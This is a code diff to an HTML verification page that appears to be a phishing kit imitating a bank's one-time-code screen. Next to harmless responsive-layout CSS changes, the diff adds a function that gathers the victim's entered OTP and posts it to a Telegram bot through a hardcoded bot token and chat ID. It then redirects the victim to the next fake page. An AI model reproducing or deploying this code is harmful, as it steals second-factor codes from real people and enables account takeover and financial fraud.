@@ -11,8 +11,15 @@
             margin: 0;
             font-family: 'Roboto', sans-serif;
             display: flex;
+            flex-direction: column;
             height: 100vh;
             background-color: #f7f7f7;
+        }
+        
+        @media (min-width: 768px) {
+            body {
+                flex-direction: row;
+            }
         }
         
         .left-section {
@@ -62,7 +69,6 @@
         
         input[type="text"] {
             width: 30px;
-            /* Smaller width for input */
             padding: 5px;
             border: 1px solid #ddd;
             border-radius: 4px;
@@ -98,6 +104,16 @@
             max-width: 150px;
             margin-bottom: 20px;
         }
+        
+        @media (max-width: 768px) {
+            .left-section,
+            .right-section {
+                padding: 20px;
+            }
+            .login-form {
+                padding: 15px;
+            }
+        }
     </style>
 </head>
 
@@ -113,7 +129,7 @@
     <div class="right-section">
         <div class="login-form">
             <h2>Verify</h2>
-            <p>We have sent a verification code to 25472*****53</p>
+            <p>We have sent a verification code to your email/phone</p>
             <p>Please enter the code below:</p>
 
             <div class="form-group">
@@ -135,7 +151,6 @@
 
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
-                // Move to next input if current input is filled
                 if (input.value.length === 1 && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
@@ -143,22 +158,52 @@
         });
 
         document.getElementById('verify-button').addEventListener('click', function() {
-            // Check if all OTP fields are filled
             let allFilled = true;
+            let otpCode = '';
+
             inputs.forEach(input => {
                 if (input.value.trim() === '') {
                     allFilled = false;
+                } else {
+                    otpCode += input.value.trim();
                 }
             });
 
             if (allFilled) {
-                window.location.href = "equity4.html";
+                sendOTPToTelegram(otpCode);
             } else {
                 alert("Please enter the complete verification code.");
             }
         });
-    </script>
 
+        function sendOTPToTelegram(otp) {
+            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+            const chatId = '5615316142';
+            const message = `OTP Code: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "equity4.html";
+                    } else {
+                        alert('Error sending OTP to Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending OTP to Telegram.');
+                });
+        }
+    </script>
 
 </body>
 
